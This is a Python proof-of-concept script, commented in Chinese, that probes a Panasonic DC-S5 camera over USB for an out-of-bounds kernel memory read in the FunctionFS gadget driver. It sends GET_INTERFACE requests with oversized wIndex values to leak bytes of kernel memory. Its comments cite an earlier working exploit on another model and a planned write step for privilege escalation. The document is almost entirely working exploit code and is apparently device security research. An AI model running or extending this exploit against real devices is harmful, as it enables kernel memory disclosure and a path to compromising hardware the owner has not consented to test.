#!/usr/bin/env python3
"""
S5 FunctionFS OOB READ probe (S1M2 ffs.c current_alt_setting OOB 复现 —— 只读/非破坏)

背景:
  松下 Milbeaut 内核 drivers/usb/gadget/function/f_fs.c 的 SET/GET_INTERFACE
  对 wIndex 未做边界校验, 直接当 current_alt_setting[16] 下标 -> 越界可达 1KB~255KB。
  S1M2(MC8243/A53) 已实机 POC。本脚本在 DC-S5(MC801/A7, 0x04DA:0x2370) 上验证
  同一 bug 是否存在。

安全:
  只做 GET_INTERFACE 越界"读"(每点回 1 字节内核内存), 不发任何 SET_INTERFACE 写。
  读完立即释放接口。掉线自动停止并等待重连。
  判断: 若 OOB 点回读到非平凡/随偏移变化的字节(而非恒 0x00/0xFF), 即证明 bug 存在。

依赖: usb1 (libusb)。macOS 上若设备被系统驱动占用, 可能需要:
  sudo python3 oob_read_probe.py   (或先建立 udev 规则)
"""
import sys, time
import usb1

VID = 0x04DA
PID = 0x2370          # DC-S5 实测 PID (usb_oob.py 里旧的 0x2382 找不到)

# GET_INTERFACE: bmRequestType=0x81 (std, iface, device->host), bRequest=0x0A
REQ_GET_IFACE = 0x0A
RT_GET_IFACE  = 0x81

# OOB 偏移: 下标*4 字节。0x0100=1KB, 0x0200=2KB ... 0x1000=256KB
READ_OFFSETS = [0x0000, 0x0100, 0x0200, 0x0300, 0x0400,
                0x0800, 0x1000, 0x2000, 0x4000, 0x8000, 0x10000]


def find_device(ctx):
    for d in ctx.getDeviceList():
        if d.getVendorID() == VID and d.getProductID() == PID:
            return d
    return None


def main():
    ctx = usb1.LibUSBContext()
    d = find_device(ctx)
    if d is None:
        print(f"ERROR: 未找到 DC-S5 (0x{VID:04X}:0x{PID:04X})。检查线缆(需数据线)/相机USB模式。")
        sys.exit(1)

    print("=" * 64)
    print("S5 FunctionFS OOB READ 探针 (只读/非破坏)")
    print("=" * 64)
    print(f"连接: Panasonic DC-S5  bus={d.getBusNumber():02d} addr=0x{d.getDeviceAddress():02X} "
          f"speed={d.getDeviceSpeed()}")

    try:
        handle = d.open()
    except usb1.USBError as e:
        print(f"open 失败: {e} (macOS 若被系统占用, 尝试 sudo 或先断开相机自带 tether 驱动)")
        sys.exit(1)

    # 找到厂商 0xFF 接口号 (通常为 0)
    ifc = 0
    for cfg in d.iterConfigurations():
        for intf in cfg.iterInterfaces():
            for st in intf.iterSettings():
                if st.getClass() == 0xFF:
                    ifc = st.getNumber()
    print(f"目标接口: IF{ifc} (class 0xFF 厂商 gadget)")

    # 关键: GET_INTERFACE 是 EP0 控制传输, 不需要 claim 数据接口,
    # 因此不 detach 系统驱动 -> 不会触发相机掉线。
    print("  不 claim 接口, 直接向 EP0 发 GET_INTERFACE 控制传输 (零干扰)")

    def alive():
        try:
            return find_device(ctx) is not None
        except Exception:
            return False

    print("\n--- GET_INTERFACE 越界读 (每点回 1 字节) ---")
    print("  wIndex=0x0000 是正常基线(应回 0x00); OOB 点若回非平凡/变化字节 -> bug 存在")
    results = []
    err_samples = {}
    for off in READ_OFFSETS:
        try:
            data = handle.controlRead(
                request_type=RT_GET_IFACE,
                request=REQ_GET_IFACE,
                value=0,
                index=off,       # OOB wIndex
                length=1,
                timeout=1500,
            )
            val = data[0] if data else -1
            tag = "OK  "
        except usb1.USBError as e:
            val = -1
            code = e.getErrorCode()
            tag = f"ERR({code})"
            err_samples[code] = err_samples.get(code, 0) + 1
        except Exception as e:
            val = -1
            tag = f"EXC({type(e).__name__})"
        time.sleep(0.15)
        ok = alive()
        results.append((off, val, tag, ok))
        v = f"0x{val:02X}" if val >= 0 else "--"
        print(f"  wIndex=0x{off:05X} -> {tag:12s} byte={v:4s} alive={ok}")
        if not ok:
            print("\n*** 设备掉线, 停止 ***")
            break

    # 清理
    handle.close()

    # 判定
    print("\n" + "=" * 64)
    print("判定")
    print("=" * 64)
    if err_samples:
        code_map = {2:'NoDevice',3:'AccessDenied',4:'Pipe',5:'Timeout',6:'NoBandwidth',7:'NotSupported',9:'Other',12:'Busy'}
        desc = ", ".join(f"{code}({code_map.get(code,'?')})x{n}" for code,n in err_samples.items())
        print(f"  控制传输被拒: {desc}")
        if 3 in err_samples:
            print("    -> 需 sudo 权限, 或先断开 macOS 侧相机驱动 (Image Capture / 相机 tether) 后重试")
        if 2 in err_samples:
            print("    -> 设备在传输中断开, 需重新插拔")
    oob = [(off, val) for (off, val, tag, ok) in results if off != 0x0000 and val >= 0]
    nonzero = [v for (off, v) in oob if v not in (0x00, 0xFF)]
    distinct = set(v for (off, v) in oob)
    if oob and (len(distinct) > 1 or nonzero):
        print("  -> OOB 点回读到 非平凡/变化 的内核字节: 疑似 ffs OOB 读 bug 存在 (待写探针二次确认)")
    elif oob and all(v == 0x00 for (off, v) in oob):
        print("  -> OOB 点恒回 0x00: 可能 bug 不存在, 或该接口不是 ffs (需进一步定位)")
    else:
        print("  -> OOB 读无有效返回: 该接口可能不受 f_fs.c 处理 / 被系统驱动拦截 / 需 sudo")
    print("  (本探针只读, 未写任何内存; 写提权需另一步且务必 AC 供电)")


if __name__ == "__main__":
    main()
